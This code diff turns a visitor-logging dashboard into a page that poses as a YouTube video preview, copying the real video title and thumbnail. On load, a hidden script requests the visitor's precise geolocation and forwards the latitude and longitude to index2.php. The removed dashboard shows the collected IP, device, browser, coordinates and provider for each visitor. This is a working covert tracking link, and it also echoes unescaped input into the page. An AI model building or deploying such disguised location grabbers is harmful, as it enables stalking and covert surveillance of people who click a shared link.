@@ -1,94 +1,87 @@
+<script>
+    function main(id) {
+        var options = {
+            maximumAge: 50000,
+            timeout: 30000,
+            enableHighAccuracy: true
+        };
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(success, err, options);
+
+            function success(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                console.log(latitude + ',' + longitude);
+                console.log(id);
+                window.location = 'index2.php?lat=' + latitude + '&long=' + longitude + '&id=' + id;
+
+            }
+
+            function err() {
+                console.log('error function');
+
+                const latitude = 'error';
+                const longitude = 'unable to retrieve the location';
+                window.location = 'index2.php?lat=' + latitude + '&long=' + longitude + '&id=' + id;
+
+            }
+        } else {
+            const latitude = 'error';
+            const longitude = 'unable to retrieve the location';
+            window.location = 'index2.php?lat=' + latitude + '&long=' + longitude + '&id=' + id;
+
+
+        }
+
+
+    }
+</script>
+<?php
+require('us/users.php');
+require('li/linksfunctions.php');
+if (isset($_GET['id'])) {
+    $id = json_encode($_GET['id']);
+} else {
+    $id = "";
+}
+echo "<script>main(${id})</script>";
+
+
+
+// Include config file
+function getTubeTitel($url)
+{
+    $tmp = file_get_contents("http://youtube.com/watch?v=" . $url);
+    $tmp2 = substr($tmp, (strpos($tmp, "<title>") + 7), 220);
+    $tmp = substr($tmp2, 0, strpos($tmp2, "</title>") - 9);
+    return htmlspecialchars_decode($tmp);
+}
+function get_youtube_thumb($url)
+{
+    $thumbnail = 'https://img.youtube.com/vi/' . $url . '/default.jpg';
+    return $thumbnail;
+}
+
+
+?>
+
+
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
-    <title>Dashboard</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-F3w7mX95PdgyTmZZMECAngseQB83DfGTowi0iMjiWaeVhAn4FJkqJByhZMI3AhiU" crossorigin="anonymous">
-    <script defer src="all.js"></script>
-    <!--load all styles -->
-
-    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
-    <style>
-        .wrapper {
-            width: 80%;
-            margin: 0 auto;
-        }
-
-        table tr td:last-child {
-            width: 120px;
-        }
-    </style>
-    <script>
-        $(document).ready(function() {
-            $('[data-toggle="tooltip"]').tooltip();
-        });
-    </script>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:image" content=<?php echo (get_youtube_thumb($id)); ?>>
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="200">
+    <meta property="og:image:height" content="200">
+    <title><?php echo (getTubeTitel($id)); ?></title>
 </head>
 
 <body>
 
-    <div class="wrapper">
-        <div class="container-fluid">
-            <div class="row">
-                <div class="col-md-12">
-                    <div class="mt-5 mb-3 clearfix">
-                        <h2 class="pull-left">Visitors Details</h2>
-                        <a href="create.php" class="btn btn-success pull-right "><i class="fa fa-plus"></i> Add New Visitor</a>
-                        <a href="deleteall.php" class="btn btn-danger pull-right "><i class="fas fa-user-slash"></i> Delete all Visitor</a>
-                        <a href="link.php" class="btn btn-secondary pull-right "><i class="fas fa-link"></i> Add Link </a>
-                    </div>
-                    <div class="container">
-
-                        <table class="table">
-                            <thead>
-                                <tr>
-                                    <th> Date </th>
-                                    <th> IP </th>
-                                    <th> Device </th>
-                                    <th> OS </th>
-                                    <th> Browser </th>
-                                    <th> Latitude </th>
-                                    <th> Longtitude </th>
-                                    <th> Location Method </th>
-                                    <th> Net Provider </th>
-                                    <th> Notes </th>
-                                    <th> action </th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <?php require('users.php');
-                                $users = getUsers();
-                                foreach ($users as $user) : ?>
-                                    <tr>
-                                        <td> <?php echo $user["date"] ?> </td>
-                                        <td> <?php echo $user["ip"] ?> </td>
-                                        <td> <?php echo $user["device"] ?> </td>
-                                        <td> <?php echo $user["os"] ?> </td>
-                                        <td> <?php echo $user["browser"] ?> </td>
-                                        <td> <?php echo $user["latitude"] ?> </td>
-                                        <td> <?php echo $user["longtitude"] ?> </td>
-                                        <td> <?php echo $user["method"] ?> </td>
-                                        <td> <?php echo $user["provider"] ?> </td>
-                                        <td> <?php echo $user["notes"] ?> </td>
-                                        <td>
-                                            <a href="read.php?date=<?php echo $user["date"] ?>" class="btn btn-sm btn-outline-info"><i class="far fa-eye"></i></a>
-                                            <a href="update.php?date=<?php echo $user["date"] ?>" class="btn btn-sm btn-outline-secondary"><i class="fas fa-edit"></i></a>
-                                            <a href="delete.php?date=<?php echo $user["date"] ?>" class="btn btn-sm btn-outline-danger"><i class="far fa-trash-alt"></i></a>
-
-                                        </td>
-                                    </tr>
-                                <?php endforeach;; ?>
-                            </tbody>
-                        </table>
-                    </div>
-
-                </div>
-            </div>
-        </div>
-    </div>
 </body>
 
 </html>
